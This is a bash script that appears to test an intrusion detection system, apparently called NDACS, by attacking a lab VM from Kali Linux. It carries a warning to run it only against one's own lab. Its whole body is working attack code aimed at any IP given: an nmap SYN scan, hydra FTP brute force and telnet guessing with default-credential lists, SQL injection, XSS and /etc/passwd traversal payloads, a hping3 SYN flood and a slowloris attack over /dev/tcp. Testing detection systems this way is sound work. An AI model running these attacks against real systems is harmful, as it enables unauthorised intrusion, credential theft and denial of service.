#!/usr/bin/env bash
# =============================================================================
#  NDACS attack simulation - run on the ATTACKER VM (e.g. Kali Linux)
#  ONLY against your own lab VM running NDACS. Never against other systems.
#
#  Usage:  bash simulate_attacks.sh <NDACS-VM-IP> [scan|bruteforce|web|synflood|slowloris|all]
#  Needs:  sudo apt install -y nmap hping3 hydra curl    (preinstalled on Kali)
# =============================================================================
TARGET="$1"; WHAT="${2:-all}"
[ -z "$TARGET" ] && { echo "usage: $0 <target-ip> [scan|bruteforce|web|synflood|slowloris|all]"; exit 1; }
WL=$(mktemp); printf "admin\nroot\nuser\ntest\noracle\npi\n" > "$WL"
PL=$(mktemp); printf "123456\npassword\nadmin\nroot\ntoor\nqwerty\nraspberry\nletmein\n" > "$PL"

banner(){ echo; echo "=================== $1 ==================="; sleep 1; }

scan(){ banner "1. PORT SCAN (nmap SYN scan of 1000 ports)"
  sudo nmap -sS -T4 --top-ports 1000 "$TARGET"; }

bruteforce(){ banner "2. FTP BRUTE FORCE against the honeypot (hydra)"
  hydra -L "$WL" -P "$PL" -t 4 -f -I ftp://"$TARGET":2121
  banner "2b. TELNET credential guessing (honeypot)"
  for u in admin root pi; do { sleep 1; echo "$u"; sleep 1; echo "123456"; sleep 2; } | timeout 6 nc "$TARGET" 2323 >/dev/null; done; }

web(){ banner "3. WEB ATTACKS - SQL injection / XSS / traversal against the honeypot web panel"
  for p in "/index.php?id=1'%20OR%201=1--%20" "/search?q=<script>alert(1)</script>" "/../../etc/passwd" \
           "/login.php?user=admin'%20UNION%20SELECT%20password%20FROM%20users--%20"; do
    curl -s -o /dev/null -w "%{http_code} $p\n" "http://$TARGET:8081$p"; done
  for i in $(seq 1 10); do curl -s -o /dev/null -d "username=admin&password=pass$i" "http://$TARGET:8081/login"; done
  echo "sent 10 login attempts"; }

synflood(){ banner "4. SYN FLOOD for 10 seconds (hping3)"
  sudo timeout 10 hping3 -S -p 80 --faster "$TARGET" 2>/dev/null; echo "flood stopped"; }

slowloris(){ banner "5. SLOW HTTP (slowloris-style) - 60 slow connections for 30 s"
  for i in $(seq 1 60); do ( exec 3<>/dev/tcp/"$TARGET"/80 2>/dev/null && printf "GET / HTTP/1.1\r\nHost: x\r\n" >&3 &&
    for k in 1 2 3; do sleep 10; printf "X-a: b\r\n" >&3; done ) 2>/dev/null & done; wait; echo done; }

case "$WHAT" in
  scan) scan ;; bruteforce) bruteforce ;; web) web ;; synflood) synflood ;; slowloris) slowloris ;;
  all) scan; bruteforce; web; synflood ;;
  *) echo "unknown attack $WHAT" ;;
esac
rm -f "$WL" "$PL"
echo; echo "Done - check the NDACS dashboard: http://$TARGET:5000"
